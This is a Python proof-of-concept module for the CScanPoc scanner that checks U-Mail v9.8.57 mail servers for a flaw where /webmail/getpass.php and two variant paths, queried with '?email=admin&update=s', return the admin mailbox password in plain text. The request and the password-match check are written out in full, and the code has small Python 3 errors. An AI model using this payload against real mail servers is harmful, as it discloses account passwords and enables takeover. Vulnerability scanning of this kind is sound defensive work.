# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

import re
import urllib


class Vuln(ABVuln):
    vuln_id = 'U-Mail_0001'  # 平台漏洞编号，留空
    name = 'U-Mail v9.8.57 /getpass.php 信息泄漏漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2014-05-22'  # 漏洞公布时间
    desc = '''
        U-Mail专家级邮件系统是福洽科技最新推出的第四代企业邮局系统。该产品依托福洽科技在信息领域中领先的技术与完善的服务，专门针对互联网信息技术的特点，综合多行业多领域不同类型企业自身信息管理发展的特点，采用与国际先进技术接轨的专业系统和设备，将先进的网络信息技术与企业自身的信息管理需要完美的结合起来。
        U-Mail /webmail/getpass.php 邮箱明文密码泄露。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'U-Mail'  # 漏洞应用名称
    product_version = 'v9.8.57'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b3654e90-63dc-4b1f-b7ee-92e908927b52'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # After a successful attack, modify the email parameters for the target mailbox
            vul_paths = [
                '/webmail/getpass.php',
                '/webmail/getpass1.php',
                '/webmail/getpass2.php'
            ]
            payload = "?email=admin&update=s"
            url = self.target
            for paths in vul_paths:
                verify_url = url + paths + payload
                req = urllib.request.Request(verify_url)
                try:
                    content = urllib.request.urlopen(req).read()
                    m = re.compile(
                        r'Your password is|你的密碼是|你的密码是').findall(content)
                except:
                    continue
                if m:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
